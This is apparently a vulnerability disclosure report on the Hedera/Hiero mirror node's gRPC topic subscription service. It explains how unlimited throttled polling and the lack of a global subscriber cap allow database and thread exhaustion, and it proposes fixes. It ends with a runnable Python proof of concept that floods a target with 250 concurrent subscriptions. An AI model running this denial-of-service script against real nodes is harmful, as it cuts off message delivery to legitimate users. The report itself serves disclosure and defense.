### Title
Unbounded Concurrent Throttled Subscriptions Enable Resource Exhaustion via Infinite Polling Loop

### Summary
`PollingContext` unconditionally sets `numRepeats = Long.MAX_VALUE` when `throttled=true`, and `TopicMessageServiceImpl` tracks subscriber count only as a metric gauge with no enforcement cap. An unauthenticated attacker can open many gRPC connections, each with up to 5 subscriptions targeting a topic with large historical data, causing each subscription to poll the database every 2 seconds indefinitely — exhausting DB connections and scheduler threads and starving legitimate subscribers of new message delivery.

### Finding Description

**Code path:**

`PollingTopicMessageRetriever.java`, `PollingContext` constructor, lines 98–101:
```java
if (throttled) {
    numRepeats = Long.MAX_VALUE;          // no upper bound
    frequency = retrieverProperties.getPollingFrequency();  // default 2s
    maxPageSize = retrieverProperties.getMaxPageSize();     // default 1000
}
```

`isComplete()` (lines 121–128) only returns `true` for the throttled path when a page returns fewer rows than `maxPageSize`:
```java
if (throttled) {
    return pageSize.get() < retrieverProperties.getMaxPageSize() || limitHit;
}
```

For a topic with millions of historical messages, every page returns exactly 1000 rows, so `isComplete()` always returns `false`, and the `RepeatSpec` loop (line 52) continues indefinitely up to `Long.MAX_VALUE` iterations.

`TopicMessageServiceImpl.java` lines 48 and 88–91:
```java
private final AtomicLong subscriberCount = new AtomicLong(0L);
// ...
.doOnSubscribe(s -> subscriberCount.incrementAndGet())
.doFinally(s -> subscriberCount.decrementAndGet())
```
`subscriberCount` is registered only as a Micrometer `Gauge` (lines 52–55) — it is **never checked** against any maximum before accepting a new subscription. There is no rejection gate.

**Root cause:** The design assumes that either (a) historical data is finite and will be exhausted quickly, or (b) per-connection limits are sufficient. Both assumptions fail: a topic with large history keeps pages full indefinitely, and `maxConcurrentCallsPerConnection=5` is per-connection, not global.

**Exploit flow:**
1. Attacker identifies (or creates) a topic with a large number of historical messages.
2. Attacker opens `C` TCP connections to port 5600; each connection is allowed 5 concurrent gRPC calls (`maxConcurrentCallsPerConnection=5`), yielding `5C` simultaneous subscriptions.
3. Each subscription calls `subscribeTopic` with `startTime=0` and no `limit`, triggering `retrieve(filter, true)` (throttled).
4. Each `PollingContext` sets `numRepeats=Long.MAX_VALUE` and polls the DB every 2 seconds.
5. With `5C` subscriptions each issuing a DB query every 2 seconds, the HikariCP connection pool (shared, finite) is saturated.
6. Legitimate subscribers' `poll()` calls queue behind attacker queries; the `boundedElastic()` scheduler's task queue fills; new message delivery to real subscribers is delayed or dropped.

### Impact Explanation

- **DB connection exhaustion:** Each active poll holds a JDBC connection for the duration of `topicMessageRepository.findByFilter(newFilter)`. With enough concurrent subscriptions, the HikariCP pool is fully occupied, causing legitimate queries to time out.
- **Scheduler thread starvation:** `Schedulers.boundedElastic()` has a bounded thread cap (`10 × CPU cores`). Hundreds of polling tasks competing on this scheduler delay the `live` message path for legitimate subscribers.
- **No natural termination:** As long as the topic has a full page of messages on each poll, the throttled retriever never completes. The `.timeout(60s)` only fires if **no item is emitted for 60 seconds** — it does not fire while messages flow normally.
- **Severity: High** — complete denial of new-message delivery to legitimate subscribers is achievable with modest attacker resources (a few dozen connections).

### Likelihood Explanation

- The gRPC `subscribeTopic` endpoint is unauthenticated and publicly reachable on port 5600.
- No API key, token, or identity check is performed in `ConsensusController.subscribeTopic()`.
- Opening many TCP connections and issuing `subscribeTopic` RPCs requires only a standard gRPC client library.
- The attack is repeatable and persistent: subscriptions survive until the attacker disconnects or the server runs out of resources.
- A topic with large history is trivially available on mainnet (any high-volume HCS topic).

### Recommendation

1. **Enforce a global subscription cap** in `TopicMessageServiceImpl.subscribeTopic()`: check `subscriberCount` against a configurable maximum before accepting a new subscription and return `RESOURCE_EXHAUSTED` if exceeded.
2. **Add a per-IP or per-connection subscription rate limit** at the Netty layer or via a gRPC interceptor.
3. **Cap `numRepeats` for the throttled path** to a large but finite value (e.g., configurable `maxThrottledPolls`), or add a wall-clock deadline independent of emission gaps.
4. **Add a total-duration timeout** (not just an inter-emission timeout) to `retrieve()` so that a single subscription cannot hold resources indefinitely regardless of message flow.

### Proof of Concept

```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto.services import basic_types_pb2, timestamp_pb2

TARGET = "mirror-node-grpc:5600"
TOPIC_SHARD, TOPIC_REALM, TOPIC_NUM = 0, 0, 1234  # high-volume topic

def flood_subscription():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(shardNum=TOPIC_SHARD,
                                        realmNum=TOPIC_REALM,
                                        topicNum=TOPIC_NUM),
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0),
        # no limit, no end time → indefinite throttled polling
    )
    for _ in stub.subscribeTopic(query):
        pass  # consume slowly to keep subscription alive

# Open 50 connections × 5 calls each = 250 concurrent throttled pollers
threads = []
for _ in range(250):
    t = threading.Thread(target=flood_subscription, daemon=True)
    t.start()
    threads.append(t)

# Observe: legitimate subscriber latency spikes, DB connection pool exhausted,
# hiero_mirror_grpc_subscribers gauge climbs with no rejection.
for t in threads:
    t.join()
```
